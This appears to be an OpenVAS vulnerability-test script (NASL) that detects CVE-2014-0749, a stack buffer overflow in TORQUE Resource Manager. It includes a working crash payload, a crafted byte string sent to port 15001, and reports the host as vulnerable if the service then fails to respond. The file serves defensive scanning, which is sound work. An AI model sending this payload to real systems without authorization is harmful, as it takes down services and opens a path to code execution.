###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_torque_resource_manager_bof_vuln.nasl 6663 2017-07-11 09:58:05Z teissa $
#
# TORQUE Resource Manager Stack Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804456");
  script_version("$Revision: 6663 $");
  script_cve_id("CVE-2014-0749");
  script_bugtraq_id(67420);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-07-11 11:58:05 +0200 (Tue, 11 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-05-29 14:39:49 +0530 (Thu, 29 May 2014)");
  script_name("TORQUE Resource Manager Stack Buffer Overflow Vulnerability");

   tag_summary =
"This host is running TORQUE Resource Manager and is prone to stack buffer
overflow vulnerability.";

  tag_vuldetect =
"Send crafted request and check is it vulnerable to DoS or not.";

  tag_insight =
"The flaw is due to a boundary error within the 'disrsi_()' function
(src/lib/Libdis/disrsi_.c), which can be exploited to cause a stack-based
buffer overflow.";

  tag_impact =
"Successful exploitation will allow remote attacker to execute arbitrary code
and cause a denial of service.

Impact Level: Application";

  tag_affected =
"TORQUE versions 2.5 through 2.5.13";

  tag_solution =
"Upgrade to TORQUE 4.2 or later,
http://www.adaptivecomputing.com/support/download-center/torque-download ";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2014/May/75");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/126651");
  script_xref(name : "URL" , value : "https://labs.mwrinfosecurity.com/advisories/2014/05/14/torque-buffer-overflow/");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(15001);
  exit(0);
}


## Variable Initialization
trmSock = "";
trmRecv = "";
DnsPort = 15001;

## Check the port status
if(!get_port_state(DnsPort)){
  exit(0);
}

## exit if socket is not created
trmSock = open_sock_tcp(DnsPort);
if(!trmSock) {
  exit(0);
}

send(socket:trmSock, data:"--help");
trmRecv = recv(socket:trmSock, length:1024);

#Confirm the server
if("DIS based Request Protocol MSG=cannot decode message" >!< trmRecv)
{
  error_message(port:DnsPort, data:"Application is not responding");
  close(trmSock);
  exit(-1);
}

close(trmSock);

## open the socket 2nd time
trmSock = open_sock_tcp(DnsPort);
if(!trmSock){
  exit(0);
}

## Construct the bad request
BadData = raw_string(0x33, 0x31, 0x34, 0x33, 0x31) +
          crap(data: raw_string(0x00), length: 135) +
          raw_string(0xc0, 0x18, 0x76, 0xf7, 0xff,
          0x7f, 0x00, 0x00);

## send the request
send(socket:trmSock, data:BadData);
close(trmSock);

sleep(1);

## check the application is crashed or not
trmSock = open_sock_tcp(DnsPort);
if(!trmSock)
{
  security_message(DnsPort);
  exit(0);
}

close(trmSock);
